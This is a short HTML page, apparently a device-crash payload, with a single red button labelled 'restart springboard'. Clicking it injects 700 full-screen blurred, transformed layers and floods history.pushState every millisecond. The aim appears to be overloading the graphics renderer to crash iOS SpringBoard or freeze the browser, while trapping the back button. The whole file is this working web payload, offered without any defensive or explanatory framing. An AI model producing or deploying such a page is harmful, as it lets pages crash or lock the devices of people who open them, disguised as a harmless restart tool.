<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡️</title>
    <style>
        body {
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        #respringButton {
            background-color: red;
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            border-radius: 10px;
            font-family: sans-serif;
        }
    </style>
</head>
<body>

    <button id="respringButton">restart springboard</button>

    <script>
        document.getElementById('respringButton').onclick = function() {
            // Твой код без изменений:
            for (let i = 0; i < 700; i++) {
                const d = document.createElement('div');
                d.style.cssText = 'position:fixed;width:100vw;height:100vh;' +
                                  'backdrop-filter:blur(180px);-webkit-backdrop-filter:blur(180px);' +
                                  'opacity:0.95;z-index:' + (9999 + i) + ';' +
                                  'transform:translate3d(' + i + 'px,' + i + 'px,' + i + 'px);';
                document.body.appendChild(d);
            }

            setInterval(() => {
                window.history.pushState(null, "", window.location.href);
            }, 1);
        };
    </script>
</body>
</html>
